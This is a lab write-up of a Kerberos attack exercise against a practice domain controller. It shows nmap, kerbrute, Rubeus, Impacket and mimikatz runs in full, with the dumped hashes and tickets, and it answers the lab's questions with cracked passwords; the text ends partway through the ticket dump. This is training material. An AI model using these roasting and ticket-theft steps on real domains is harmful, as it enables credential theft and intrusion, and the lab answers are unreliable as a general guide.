# Attacking Kerberos 

---------------------------------
>Nathaniel Mickel | 21 Sept, 2021
---------------------------------

```bash
export IP=10.10.233.169
```

## NMAP Scan
```
# Nmap 7.91 scan initiated Tue Sep 21 19:27:30 2021 as: nmap -sC -sV -oN nmap/initial 10.10.233.159
Nmap scan report for 10.10.233.159
Host is up (0.12s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
|_  256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-22 00:28:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-09-22T00:28:15+00:00
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Not valid before: 2021-09-21T00:13:45
|_Not valid after:  2022-03-23T00:13:45
|_ssl-date: 2021-09-22T00:28:26+00:00; 0s from scanner time.
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-22T00:28:20
|_  start_date: N/A
```
## Kerbrute Enumeration
```
 kerbrute userenum --dc 10.10.233.159 -d CONTROLLER.local /usr/share/seclists/Active-Directory-Wordlists/User.txt

2021/09/21 19:35:59 >  Using KDC(s):
2021/09/21 19:35:59 >  	10.10.233.159:88

2021/09/21 19:36:00 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2021/09/21 19:36:00 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2021/09/21 19:36:00 >  [+] admin2 has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$admin2@CONTROLLER.LOCAL:36a42738198ce26d8ed4e3282512b158$f6ddb2c7feaea2f7b7c541a0913e13120d7ccd6073ffe931a213a58bbcdac4ba0647bc65157b5f160f24f9701def95e2d27abd16b86fe0dfb35eb3953a79c484ba951fa5463cdda344c201e2b81ee2f239902d5cea20cc405a41fa8ca51e3f75a13920a0ca25ae764a9082473a4f805d08130734b0ee582bb849de088e0043145156ce5bad47965176e7d4b4edf5fe5c3701cab3c6df1e259ffcafe66de8ed0ff31dada58fd7266f785265f6a33f0ce973ae07bcd7f4adfd1509f52e8720995fa767854e7658694342d4a5a80830fba4950448b9baa76fb7697b15c4e03bd72f907553999380167ff60081d53c9649476ddc8d5e6b9dee7d9e6d9e480bce1b3636de3f225e1271b4
2021/09/21 19:36:00 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2021/09/21 19:36:01 >  [+] user3 has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$user3@CONTROLLER.LOCAL:86a3a2c5a033e69f7508f2d7f2ed5f67$82ba4fd2f85b9aa6b04887e99ebe75cbe63890432f20f26e0cc0420ca2d4b64a5611a164a395bbdd96b9b87ab02044d7b58500dbcc8a4b01766c5f1daa972d64d616bdde75828f60114250570e86ffc98af771da4b18f082d45dfc5781a258712e7467ea9d42337666e2dcdcd56ce85b11aa45adb5cb74849d39e08cea8ab772ecc5374fcd7cf1399b9c901795af67e091036104a1c1c345d739aebdf2e65b7f986f8b5d206fe98f536c998152128c18af94a277db36c9ff36d74eba21ae1cf3b82a506ef13326c297bcc7f3bfa08f76b658ca34347dc9200dbf7e65a9ea5afc97adb3a372abb20affcdee10a9c2f15aa51f1986ce49c8b59c8d4cd558d515e78a393976d45c5a10
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2021/09/21 19:36:01 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2021/09/21 19:36:01 >  Done! Tested 100 usernames (10 valid) in 1.995 seconds
```
## Task 2: Enumeration w/ Kerbrute 
### How many total users do we enumerate?
```
10
```
### What is the SQL service account name?
```
sqlservice
```
### What is the second "machine" account name?
```
machine2
```
### What is the third "user" account name?
```
user3
```
## Task 3: Harvesting & Brute-Forcing Tickets w/ Rubeus 
### Which domain admin do we get a ticket for when harvesting tickets?
```
Administrator
```
### Which domain controller do we get a ticket for when harvesting tickets?
```
CONTROLLER-1
```
## Task 4: Kerberoasting w/ Rubeus & Impacket
### Getting Hash w/ Rubeus
```
PS C:\Users\Administrator\Downloads> .\Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca
                             l:30111*$73586B5BD55E2F19D3D5D817046268B2$92C575504FC1D7AC0C7EE12B7068AB7C8005A2
                             8DAC57D276AF9730F11623696D0CE7C9842971F6A5380719A20088D1B50624A156529A2CCD9ED5B0
                             C2D8EE5062C1149EDA763279B924AADE7DDF36DD9D346D3EF63095C7829170401EEE504BBDF613E9
                             4E3ACA3B65DD08969290AD168D73D98E350E4DE3608A43E3BAF94FE844C280DFB3868949DB95E5B9
                             1759FF473290AEA7BD686296BAA976E18214C16C99A1C7E98ED13C566267B01D5F3F7137B812D6D2
                             56714E3B9E101D42906B539BC1B5B5E033B74114795646520D86AF6392F70D7B014A622F42B16ED1
                             C6088A4C8C19E6012023656BEE8B246EF3571E99D00F29ACF5259FF276660796DDFAA0F3164DDBBC
                             46636A9D9CA8DEB5145EB1322E10E9192CBCD0B29AE94168590466A5A5A0F4E6D5C8269A1ECC7814
                             AB79F05F3A56C4DB9D31EF21E3C6A0A477313032AB6B7BD375A41EB1D7D845B52A31236CB38F783D
                             466C026EED5BB1230C6664B8134D91E2633F07B81634B15B59A86192CFEB3746713DBF695F67B8F5
                             89E0F296E164F55127775C46F7033E75AD3D36077EE46BBD7055B00BB0B4D5326C0357027367339A
                             42EC49A82DFCD9C33C9B03A5E4C3C0AEFA3EC3C3B07705AE82DC150601B950CD14B7BDE48B8AB366
                             A34488D0F81375A76BA043036664918579E2991CC93841870A479B12090391457E034F08CEA37DC8
                             5BEAFC3C9230AA7B05207666E6C354EE0EB28B8125DEDB208B073CAA97D1FF3B7581E3C0E6B7E408
                             8E02E1771EF06C50337F0A97EE110226BE509A0C6360DBB116831AEFFEEB32E2EEBB32F0E252F82D
                             9B1A92AE6D641564671A586C00E6E5E058D2EC1D6F3925E8658A56B968A56BF3A432627A6EDC6FE6
                             85E3D77DAE25FEC653649EFC4E06E58F4D90B1AA53F0C5F59D57E283128BD9CDE0B29176E2FA6BD3
                             DF9F7BDE3AB39C684D9419FA7BB06AE3136DE2E41929D25CD79664B3D6F2C5D69983430BF77760DB
                             CAF901591C00B52F194B98EE2B37B8B26FE6FB5CB0CA9AA14391F826E3DF39EB38ECE1E14CB9331A
                             09539BE8ED1A67782E0339EB7726855D9F2E92679B007EDA8DF54364075E50D77CD7B13708B21473
                             BC1E5BAAD52B7FEA5073EDD5341973A99DE6E6AFABDB48CF5752247B4C8A16359D8D1F3CA935368A
                             A34CD05402BFFD2BC2E4FC76118B709CCD5D5B89D0FD7D0E7F07F431B38AC28D3524AC16B3549566
                             BF52BC976F19F7A08AB638A5399F6F3259DA543119AFFD7AF54AB4A568ACE70C87A5EC5D829506C0
                             E3F95D2EB3BE85111DC6A8D0A4BEE52BBC84B30AEBCB0A43738685A8937335A5A98DA8162FA4BE67
                             7AE0C5C46FFF20A8357A4F436C45A946205DB47D14472E54EE728E4EC351B11DA5551D3435329F3C
                             93C2C0B33EE9ACF6D64423D098DCC641429916BA404506A63E3935BFBBC84B692D0BAA4D01A70417
                             FB7A4073CDEFF8878501EF287F8FF1063AF9C34F0FF16974D683BD7E242414255F86CE3179C4B50F
                             DAC64936F17136BC5B865BA2003C4FA6DED487CD516BF23142CB254B5C21BC6C03B0F7F612CD8238
                             8387ABE3393698D2C21DF3D54ADD1AF9BF8CBED2E3052A90B6A62A9E0D103A89CFA4C0471394416A
                             3DF2492A69E9F6D5931ABC99BB218811A829A7E445A2D1623296450DF5


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$566995DCE21C5DC0BF695C2568E875DC$9D219180157C74B1F32A08AB91D96B4BF678
                             92134FA3ACF482A8A78EDEBC359F760C6FE65BFF3E7A52402EC6D4E7200F459C5057F00984765C83
                             93E75C9C148EECA26B80F9EB23740A45E70A377784AD06E86E82DA8233D4908C0418EFCB00EE0C33
                             424F7874E0A556A26D5D2AD26EC17B4357CB23019954DDC02788E6F26588F5ED5AAA2008867779EE
                             42A4C9F70DD2D6FEC17AA1C639019E68D1A39DD123ED6666F1566372F070DF947000990A7F9A9B90
                             12B20FA4ED3480BD9A3251346564150428AAE84BD7C9474C09B6D48EFA1E43257F10498E5E9B1177
                             5D582544BEEBFA6FDAD39BE53076880E68E80D4F7330E009455D03AE4F705ACB95E4A925D6D54498
                             7118B107420C3F82F2B2FFA6A412881B8E9E9056954FFECE6D74C5DC46B7805450BB62FF8001C60E
                             CBF9755EA0C83E9BC39A5C30F012174FF10C2ED7FD8512B19EAE7AC6839E3D2DE480AC5A0A5A8AB9
                             F28F7B334EB2BC00DD7707F91D54966CF919A323C41CA0C48334A0B11E4892C9BE7430996A268B91
                             5CAD9FB6E1D42E4B2308348397FC1EF9456FED335F3F20F2FDD515F1BCCB77011E8E5CCB1022C79C
                             3BB8F7D7441CFBD27C121B84B4FB3F08697A3ECE07632F043F253C4D6FD81147AD09A8801B474539
                             13E1CA92EBF1D3DE8BE78F5FA7B00AAD0BD25E05EC6F0CE76850D405560D6A7F90E34B10834C3A23
                             F60A1B18C95142C482E9BC323B403883AC0599A6B768624B1D93467E90024B01BE02E460930FBA5A
                             F652D88C5D9A0431892DB892C9C86C5880FEBC653C0384B3179BEF4943EAFE458E6B481FD9159CB4
                             6157875680DAC779BAE74D73FD2D25BACFD494B588BFD6C9EF1D9484F3E371BF36987340CE758D9D
                             C3BE0B1986D99AB9254DDB192C7D73FEB756D01076450A37C26E1B4D91CDA4B3DEEF0E20F01C50CF
                             3454900B037D8D78D7E3D3BBA98E1783AF5966CF5202983F008882D37957D089412B2136500D4BD6
                             3B8B7C05840777AFB5C750378D5901CE5CB65E7F350E0A68748B20FFE2ECFF25E1F1F2E058A2A3F2
                             66F3BCCC07114CCFD30A50F9954178C06A18A906A61FFC2358AAED02092526EAE9D73D678809BE82
                             86FA8AE8891C854D239144A166383B7BC34BCE695C4C5743142B7E7614F17C344D46730C6C81051C
                             BEEB8D984B6C9513B00CEBAB965AE8C6E57FAA13998B48A3FDB9AE4EBBFA50D626D817488D3115F2
                             F366A5456C3F3FC1BCE16A47C424DC0F6F67672EED54E3A9528185D8FF805BE03953B4916C296DAF
                             B86FCBFA8F409078F433DF62CE54DB8BCEAECF295C1C0E6E2B9C3C767A3BC342BED7D5F5A5A2F365
                             4DD940BE3C5998A69C2B20E2712BB62470DC7F47CEA95D114A28DBB129D7BE663EA474327B5074C0
                             6CE4E41C6567791C86B6F6404F44FED8E087D34C570A13EFE2A0303A6978FF0B25DCD63154A4EE50
                             66C11C7C721CC0D490A60520A149360C8FE509F0EAF7471B7E74D0B3C2A7ED52F59251149E89C23B
                             7111F42F3BF9103A8D767B8A8871D75623CE1206B81B2972ED4403445903DB4CE15A6D866AACD354
                             7C56D73D989C36023BB1DBFA1F1A66C25F4BA44F92D4BE5D23EA7EC688ECF720FFB68051CFA116A5
                             0417506FB20014BB47D3902496EC54FC68BCD80F81C0A9AC2DBC7CB0332C
```
### Getting Hash w/ Impacket
```
python3 /opt/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.233.159 -request                                                                                                                        1 ⨯
Impacket v0.9.24.dev1+20210921.151127.f0574776 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 17:28:26.922527  2020-05-25 17:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 17:39:17.578393  2020-05-25 17:40:14.671872             



$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$b911eac90721e76d32be4078494760d1$0c55fe26f584052123632b505b096443d0468936b1a4b5079afa8c9595ed03b0dd7ebf73bd5df7c8bd1f83cd3421d5a2f2b87a1e65877f095008db305591e0739504b098c0b3e56bba55059feeefa3f53b96b244770032fa884b2708a9cd6ae076802fc113619dad00bb4aed772ed724663e1829590e2f3f5250b17551ef3d36efb0060a8ab9db826049c12f94223b66eb5658e521df452d0f1a3627079e3f13cda42ca68be7c20f4842ec1b4f26229e5fbc50ca6ee8ddd62af50d79194755b639bf5ca8619fd9fc294bc03961e159d7c1b63c81d19073f3e4572c2e87a5994e9832024462a0ea2cb22cdae03c8b8b82f2dbc941a628937fed579edd229f3c8f469343c427ee41d29b09f93034541c5f6c8c69fb44585b3c64f157ec274b490f76b4ecfceda248f0bbc308f9e595736fe25becb1bcbc44a46757f545bf78767cf8939afad48bc00b253a99ee9b53a044edb2ce683a2c024fbe5ca4396ccb642b3f7ae0983a95cc8d9027362fd57f2526a6708c650b3a038286d45062da54dd45fd72f8051b4f56fd2fdb6c08403c3c707cefa2bec37eaf453eb94703a719694ec56b1f9d656397bc81121b59e650753fe96eb4a8a283ebb7b94f6de8ca503888016786f5497ea57139b46a97258d1ded9c894d53f2f2f9a93648cfbc8d67cf3de76a612a475dc5d535063fd850f909f5fcd906836414e52c14a66a697f0d5071d0518cfac37165a0d366b87d3683b367d41153464ba56289a5c15478b34734f461904032f5b22e9678e721f423bf9a7cc7d76b6ed0840879f0636193b33c4da549b46b97dcbcb8028daba8ee74a7d11a61495f18b8c5784beb30d6050588376e6ca0228dde623ec52339b2b7ff03ffce0119249681e893085d288f942b930d470c3ce7eeba4128e2a4e0fcc047d15b92c17f8155eacb3f7e46a0f02ce83d9949c3af6d19905bd6c3d84fdef95466392f221522f0778fb250752993727ba62cf7d5f2723163737f4094c64cc69425253eb1f421ad98da7f7224a09156c5110201d42405fe3f44f9e0081e8f093f6c0c9d1c0a55a410cd10b0a6279626cd79d695116d0a4ee2fb1fa1f210b723f94e9e82c429439bc80c6780bcce49e83677919dcdf7995a32b1310172beb5e1c6022e87bb53a4e0e90a5f78a93e1a0743c2c6eee122b8c453a7fdf7f9f9e8fe21f19ebe25a80c5989d2a07ee125707976b0876cc776b906596a496b230cf67fcea0c03100960e12381512136357ce07ff8993a0174c8f1647425280e5e752ca645b42778348efafa34ff2bee7b86c0585903cf32a255a38d36c6cc30c617ab294c9ef2f20b03786d6f71dcc130521caea5d3e36544c0f622ff1e897716244f633536e91ae
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$e8998458ee0723db618a4808cfde1f01$17b40d752c129b6253dad22c9c3ff2e3acade98502b6f8af72bbc5035185ae7a77a92181027a6f6a9dce27eff20406fca535176cdee75f360627093bd396f250c4ff854a6196e1a73d737e2bf3c9aa1276ee22d43057302f1d5fd1756a48f54f9ae22a9984bffc1381ac60fbb5859f078b158308152908cdd2e10523daaacc62adea6d845cca8850f1c88f75f42a3a5afc9dce5070e6eec326ada776d2c5d2f93f62ef6288122b817d846e378c3fba7798ac8705e6926e6ea31213d97bcfa1f3825e62e66a54c778633e8447b4bac8fd0977fa5b9f1a7da4b3108d4d06464d00315d202ab18ce2e188b8c3d469bfaa781a75f51b5c7be3601c39ed5c29c1ed4b29aa4285045da94ce9fd72c23aa4cfd439df0a2e8d811f24757c0eb53fbc2d9f01daeadb9ea74a6b76dd743bcf72a2c1353273191c9776771c7605c93b6e8ad25ab84852b1616702b202724b1b151aacc34eb4acdb8e7b937fe87577c00d4609715eef56c931b73ad3b9170426969ffeb0b79c23d622da5e3ce3f92b24469622d9262d933ca3d5682cf7f793685475a9af00ddb180a14a27c52d500c5c9a70fc8a7156fb45361900c739776815944edf156bb8cce2216c098b1027af0802f52778213842ccdc251bb38393ecb5b41ada17dae90811af2b1a426c0e9fdf4529961338ecfab55926d6f431076d8fad1df6db19b865c82b139fd8416dd1e4f5b037972230abf9a9cc15390fe0f9f22bf227b48cfe12b0eba035c420f9fde72e3e321124f181265b4c5a2d6f08d5dc89a8d0b81a4291101fed7539767fe099c4245345091d050905e68e40ecc5e939fb7ad917f152d9acc67f4dda8397145bf114ee67b1410eac3dafbf7a84fc0cfa858bf9737d2c8a1b15fb4dca8376c9d49f49f0739d9a73ca4afe1b9c7ab2a9f56cbcd07caac5acd32e2a3a5230834c48236d141c9974956825e1956292d08d452de618b33373fd6b7b0eed2901cd3735e452775ed587776d562548e44fc0c60337038bbc7319e618234147b715019ad5f5308d6db112097d29c7fbb6e257a4ce97c3dcb1e449e0ec216351a0f690ec466f39c944bc01a292ce1b8219e9ab895590d87d4f669b2218d7193b73e16049a15f84565c4a768194a717df7db8c7c70b812cea38d4317edab39fa756f6251aefc9f4d015cddc501c03863ea2e5cb597b31a990eaa9af6d53d4346656ea7769f6e9b4c7a7dc33a5dfd22b1693bd2b783bcedd0a3b5fe372bbbefb5d41991bdf46391335160e8aff685599de83e936e4a35e83211b123566ddc7da87fa5b6123dd577faf3e7cedd11909b0c7ef5ae09a4b5341035e4b9b59f86061c3de7a1a3d99f5f704dbc7ae1b9924792f9601004c40ce9d9769
```
### What is the HTTPService Password?
```
MYPassword123#
```
### What is the SQLService Password?
```
Summer2020
```
## Task 5: AS-REP Roasting w/ Rubeus 
### AS-REP Roast Enumeration
```
PS C:\Users\Administrator\Downloads> .\Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::a943:439d:c4df:31b9%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:BB075923AC7D07C626E5184F4C153628$16D00FC90D8E
      4F8B96D74CA8AD3F4623EDECF49E95E6C0320820B960FFECF05CED06EFABDF976B995921E6962B2A
      7941801EFEDE050FC644558AFC3CDCC22B5152902B3A62524E1659D895FAB629F9C6C772BD476022
      B7EC91671F798037BA6101EA85773113F97F4ACAB09B012A6F43E3605592A6D3B83AD4D1169918A9
      CB64611929699EDB64408C00F368682240DBCE8E91F47972B1FF193666BFE1CFE39561360B3C7ABF
      B822B0A597BD91F02CF9BE67676CE9562E437D84DF45CC0CDC8755C1E072ED58EBD4D3E8E8CF229F
      0FB3AD324884315DF74179606EC895A074096BE5B30434E9E269DE60911B60A5D53C2AA0A8EF

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::a943:439d:c4df:31b9%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:9D82A6506C69BDFDEF11F6F23F53F26E$A611FBD8B6F6C
      39D41AFB5AFFA4439D8F33F4397A3519A8859CC2B0F6EDC137A64425E9F7EC57D7F05C40CB92F955
      028AF0983201F2B98054E6211B3235AD2F60D2F2849585E983872E49D99C380910D343809AE94213
      8CB705B322774D3D12AB0D267E59E50CBE4788267CC057F153754D757B2FEC8B49037C1DE285C542
      0F25CFAAA67404E68764E2E4E9F6785A36675ABC2D116EE8DA23A76132A79FB8D8E508149F72B4FD
      417119556389615F2D494B8BA35EFA418BE9A0CA71BE5C11863B285BBB78DB69C71D84D8A5D20E6A
      8BA242A79D034439EE2DC9E0849D5C363E5447DF20AA6ECED1BB2EA5CAE949E7601ECF58B80
```
### What hash type does AS-REP Roasting use?
```
Kerberos 5 AS-REP etype
```
### Which User is vulnerable to AS-REP Roasting?
```
User3
```
### What is the User's Password?
```
Password3
```
### Which Admin is vulnerable to AS-REP Roasting?
```
Admin2
```
### What is the Admin's Password?
```
P@$$W0rd2
```
## Task 6: Pass the Ticket w/ mimikatz 
### Prepare Mimikatz & Dump Tickets 
```
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 2869027 (00000000:002bc723)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 9/21/2021 5:49:38 PM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/21/2021 6:32:15 PM ; 9/22/2021 3:49:38 AM ; 9/28/2021 5:49:38 PM
           Service Name (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             d25930a06344a429a586893d93ef410d
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;2bc723]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi !
         [00000001]
           Start/End/MaxRenew: 9/21/2021 6:32:15 PM ; 9/22/2021 3:49:38 AM ; 9/28/2021 5:49:38 PM
           Service Name (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             518dc239481b87be9cbb17a4b8bce27e
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;2bc723]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:49:38 PM ; 9/22/2021 3:49:38 AM ; 9/28/2021 5:49:38 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             fa72b08548e4115eed21872857097ae369bb6cdab6a12b908e5e64ef38f3cc3a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;2bc723]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 2841347 (00000000:002b5b03)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/21/2021 5:49:35 PM
SID               : S-1-5-90-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 20 9a f4 ba b9 50 fa 0c 0c d5 8b e8 29 6d 38 89 0f 1b 34 87 b4 f4 b7 97 c1 e6 a3 2c c5 14 08 b1 80 4b dd 0d 8f fc 92 59 a7 da 04 73 eb 2c c4 49 5d 5a d4 00 b0 dc 59 74 dd b8 9c 7b 29 2b a6 f9 d5 2e a4 c1 5a 92 5d 82 8e c6 31 07 37 f9 b9 c7 56 36 cd bc 78 16 8d 59 0c c1 79 2f d3 20 38 c5 cc 15 bf 4e 4c 81 e6 db 9b 72 0b f4 df 60 e9 f2 b1 e5 f5 b7 27 56 ad 0c e5 81 08 62 a9 c5 a0 4d 4c ef 07 77 e1 42 ab 2a 6c d1 bc 44 08 28 55 fb d7 92 42 0b dc 0f 04 c3 d8 26 53 42 6d 9c 30 2f 87 5e 30 92 8c 5d 5a a0 83 00 1b cf db 60 1c f0 cf ba 38 8a 87 b2 49 27 de d4 50 1d b7 af 55 50 01 dc ea 64 8c 26 c6 03 dd 5e a1 02 ff 2a eb 56 91 35 a7 3b 78 f5 c1 76 44 b6 2f 42 06 a9 df e0 1d 97 7b 62 bf 8b c0 d2 30 fd 99 78 b7 c2 57 fe

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1712536 (00000000:001a2198)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:28:48 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:28:48 PM ; 9/22/2021 3:14:18 AM ;
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             10a588f028389fafd9c1a7a1a7aa6a04772edf0a30ebf11388ba3f2cf631dff8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;1a2198]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 397744 (00000000:000611b0)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 9/21/2021 5:18:59 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
